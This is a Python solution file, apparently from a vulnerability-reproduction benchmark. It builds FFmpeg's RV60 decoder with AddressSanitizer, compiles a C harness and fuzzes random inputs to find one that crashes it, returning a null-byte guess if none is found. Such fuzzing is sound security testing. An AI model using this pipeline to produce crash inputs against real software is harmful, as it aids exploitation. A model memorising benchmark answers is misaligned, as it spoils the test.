import os
import sys
import subprocess
import tempfile
import shutil
import random
import struct
import tarfile
import re
import time
import glob

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Args:
            src_path: Path to the vulnerable source code tarball
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        temp_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            if src_path.endswith('.tar.gz') or src_path.endswith('.tgz'):
                with tarfile.open(src_path, 'r:gz') as tar:
                    tar.extractall(path=temp_dir)
            elif src_path.endswith('.tar.xz'):
                with tarfile.open(src_path, 'r:xz') as tar:
                    tar.extractall(path=temp_dir)
            else:
                try:
                    with tarfile.open(src_path) as tar:
                        tar.extractall(path=temp_dir)
                except:
                    pass

            src_root = temp_dir
            for root, dirs, files in os.walk(temp_dir):
                if 'configure' in files and 'libavcodec' in dirs:
                    src_root = root
                    break

            # 2. Configure FFmpeg (minimal build with ASAN)
            # -O1 gives speed + debug info for ASAN
            configure_cmd = [
                './configure',
                '--cc=clang', '--cxx=clang++', '--ld=clang',
                '--disable-everything',
                '--enable-decoder=rv60',
                '--disable-asm',
                '--disable-doc',
                '--disable-programs',
                '--disable-avdevice', '--disable-avformat', '--disable-swscale',
                '--disable-postproc', '--disable-avfilter', '--disable-network',
                '--disable-pthreads', '--disable-w32threads', '--disable-os2threads',
                '--extra-cflags=-fsanitize=address -g -O1',
                '--extra-ldflags=-fsanitize=address'
            ]
            
            subprocess.run(configure_cmd, cwd=src_root, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 3. Build libraries
            subprocess.run(['make', '-j8', 'libavcodec/libavcodec.a', 'libavutil/libavutil.a'], 
                           cwd=src_root, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 4. Create Fuzz Harness
            harness_code = r"""
#include <libavcodec/avcodec.h>
#include <libavutil/mem.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
    if (argc < 2) return 0;
    FILE *f = fopen(argv[1], "rb");
    if (!f) return 0;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *data = av_malloc(size + AV_INPUT_BUFFER_PADDING_SIZE);
    if (!data) { fclose(f); return 0; }
    fread(data, 1, size, f);
    fclose(f);
    memset(data + size, 0, AV_INPUT_BUFFER_PADDING_SIZE);

    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_RV60);
    if (!codec) codec = avcodec_find_decoder_by_name("rv60");
    if (!codec) { av_free(data); return 0; }

    AVCodecContext *c = avcodec_alloc_context3(codec);
    if (!c) { av_free(data); return 0; }
    
    // Single threaded to be deterministic and avoid threading issues
    c->thread_count = 1;

    if (avcodec_open2(c, codec, NULL) < 0) {
        avcodec_free_context(&c);
        av_free(data);
        return 0;
    }

    AVPacket *pkt = av_packet_alloc();
    pkt->data = data;
    pkt->size = size;
    AVFrame *frame = av_frame_alloc();

    int ret = avcodec_send_packet(c, pkt);
    if (ret >= 0) {
        avcodec_receive_frame(c, frame);
    }

    av_frame_free(&frame);
    av_packet_free(&pkt);
    avcodec_free_context(&c);
    av_free(data);
    return 0;
}
"""
            harness_path = os.path.join(src_root, 'fuzz_harness.c')
            with open(harness_path, 'w') as f:
                f.write(harness_code)

            # 5. Compile Harness
            harness_bin = os.path.join(src_root, 'fuzz_harness')
            compile_cmd = [
                'clang', '-fsanitize=address', '-g', '-O1',
                '-I', src_root,
                harness_path,
                '-o', harness_bin,
                os.path.join(src_root, 'libavcodec', 'libavcodec.a'),
                os.path.join(src_root, 'libavutil', 'libavutil.a'),
                '-lm', '-lz'
            ]
            subprocess.run(compile_cmd, cwd=src_root, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 6. Extract Magic Numbers from Source
            magic = []
            for r, d, f in os.walk(os.path.join(src_root, 'libavcodec')):
                for file in f:
                    if 'rv60' in file:
                        try:
                            with open(os.path.join(r, file), 'r', errors='ignore') as fc:
                                content = fc.read()
                                for m in re.findall(r'0x[0-9a-fA-F]+', content):
                                    val = int(m, 16)
                                    if val < 256: 
                                        magic.append(bytes([val]))
                                    elif val < 65536:
                                        magic.append(struct.pack('<H', val))
                                        magic.append(struct.pack('>H', val))
                                    else:
                                        magic.append(struct.pack('<I', val))
                                        magic.append(struct.pack('>I', val))
                        except: pass
            
            # Add general boundary values
            magic.extend([b'\xff\xff', b'\xff\xff\xff\xff', b'\x7f\xff', b'\x7f\xff\xff\xff'])

            # 7. Fuzzing Loop
            end_time = time.time() + 300 # 5 minutes max
            seeds = [os.urandom(149) for _ in range(20)]
            
            # Create some magic seeds
            for _ in range(30):
                s = bytearray()
                while len(s) < 149:
                    if magic and random.random() < 0.3:
                        s.extend(random.choice(magic))
                    else:
                        s.append(random.randint(0, 255))
                seeds.append(bytes(s[:149]))

            test_file = os.path.join(temp_dir, 'input.bin')
            
            # Simple genetic fuzzing
            while time.time() < end_time:
                parent = random.choice(seeds)
                mutant = bytearray(parent)
                
                # Mutate
                mutations = random.randint(1, 5)
                for _ in range(mutations):
                    r = random.random()
                    if r < 0.1 and magic: # Insert magic
                        m = random.choice(magic)
                        pos = random.randint(0, len(mutant))
                        mutant[pos:pos] = m
                    elif r < 0.5: # Flip bit
                        if mutant:
                            pos = random.randint(0, len(mutant)-1)
                            mutant[pos] ^= (1 << random.randint(0, 7))
                    elif r < 0.8: # Random byte
                        if mutant:
                            pos = random.randint(0, len(mutant)-1)
                            mutant[pos] = random.randint(0, 255)
                    else: # Delete
                        if len(mutant) > 10:
                            pos = random.randint(0, len(mutant)-1)
                            del mutant[pos]
                
                # Keep size reasonable (around 149)
                if len(mutant) > 200:
                    mutant = mutant[:200]
                if len(mutant) < 10:
                    mutant.extend(os.urandom(10))

                # Write and Run
                with open(test_file, 'wb') as f:
                    f.write(mutant)
                
                try:
                    subprocess.run([harness_bin, test_file], 
                                   timeout=1, 
                                   stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL, 
                                   check=True)
                except subprocess.CalledProcessError:
                    # Non-zero exit code means ASAN triggered (or other crash)
                    return bytes(mutant)
                except subprocess.TimeoutExpired:
                    pass
                
                # If we are here, no crash.
                # Update seeds occasionally
                if random.random() < 0.02:
                    seeds.append(bytes(mutant))
                    if len(seeds) > 500:
                        seeds.pop(0)

        except Exception as e:
            # Fallback if compilation or setup fails
            pass
        finally:
            shutil.rmtree(temp_dir)
            
        # Return a fallback input if no crash found (unlikely to work but meets type signature)
        return b'\x00' * 149